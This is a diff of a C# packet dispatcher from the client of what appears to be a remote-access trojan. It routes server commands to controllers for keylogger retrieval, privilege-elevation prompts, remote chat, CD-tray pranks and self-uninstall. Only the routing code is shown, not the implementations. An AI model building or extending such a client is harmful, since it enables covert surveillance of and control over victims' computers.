@@ -1,17 +1,30 @@
 ﻿using Client.Controllers;
 using Client.Packets.ServerPackets;
+using System.Windows.Forms;
 
 namespace Client.Packets
 {
     public static class PacketHandler
     {
-        public static void packetChecker(ClientMosaic client, IPackets packet)
+        public static void packetChecker(ClientMosaique client, IPackets packet)
         {
             var type = packet.Type;
 
             if(type == TypePackets.DoAskElevate)
             {
                 Controllers.Tools.CommandController.doAskElevate((DoAskElevate)packet, client);
+            }
+            else if (type == TypePackets.SetClientIdentifier)
+            {
+                ManageController.setClientIdentifier((SetClientIdentifier)packet, client);
+            }
+            else if (type == TypePackets.UninstallClient)
+            {
+                ClientUninstallerController.uninstall(client);
+            }
+            else if (type == TypePackets.CloseClient)
+            {
+                ManageController.CloseClient();
             }
             else if (type == TypePackets.GetMonitors)
             {
@@ -81,7 +94,26 @@ namespace Client.Packets
             {
                 KeyLoggerController.getKeyLogger((GetKeyLoggerLogs)packet, client);
             }
-            
+            else if (type == TypePackets.DoTrayCdOpenClose)
+            {
+                DoTrayCdOpenCloseController.openCloseTrayCD((DoTrayCdOpenClose)packet, client);
+            }
+            else if (type == TypePackets.SendMessageBox)
+            {
+                SendMessageBoxController.MessageBoxShow((SendMessageBox)packet);
+            }
+            else if (type == TypePackets.MsgToRemoteChat)
+            {
+                FrmRemoteChatController.msgFromRemoteChat((MsgToRemoteChat)packet, client);
+            }
+            else if (type == TypePackets.CloseRemoteChat)
+            {
+                FrmRemoteChatController.closeRemoteChat(client);
+            }
+            else if (type == TypePackets.PlaySong)
+            {
+                PlaySongController.playOnInt((PlaySong)packet);
+            }
         }
     }
 }
